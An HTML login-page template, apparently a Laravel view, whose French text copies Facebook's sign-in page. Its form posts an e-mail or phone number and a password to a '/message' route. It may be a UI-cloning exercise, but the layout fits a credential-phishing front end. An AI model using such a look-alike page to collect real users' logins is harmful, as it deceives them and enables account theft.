<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Connexion</title>
    <link rel="stylesheet" href="css/styles.css" />
    <link rel="stylesheet" href="css/media-queries.css" />
</head>

<body>
    <main class="container">
        <!-- TITLE -->
        <div class="title-container">
            <p class="title-paragraph">
                Connectez-vous avec vos amis et le monde qui vous entoure.
            </p>
        </div>
        <!-- FORM -->
        <div class="form-container">
            <form class="form" action="/message" method="POST">
                @csrf
                <div class="input-container">
                    <input type="text" placeholder="Adresse e-mail ou numéro de tél.." name="mail" class="form-input form-input--email" />
                </div>
                <div class="input-container input-container--password">
                    <input type="password" placeholder="Mot de passe" name="password" class="form-input form-input--password" />
                    <div class="password-eye-container hidden">
                        <img src="images/eye-off.png" class="password-eye eye-off" />
                    </div>
                </div>
                <button class="form-log-in-btn">Se connecter</button>
                <a href="#" class="form-forgot-password">Mot de passe oublié?</a>
                <div class="divider"></div>
                <a href="#" class="form-create-account-btn">Créer nouveau compte</a>
            </form>
            <p class="create-page-paragraph">
                <a href="#" class="create-page-link">Créer une page</a> pour une célébrité, un groupe ou une entreprise.
            </p>
        </div>
    </main>
    <script src="js/script.js"></script>
</body>

</html>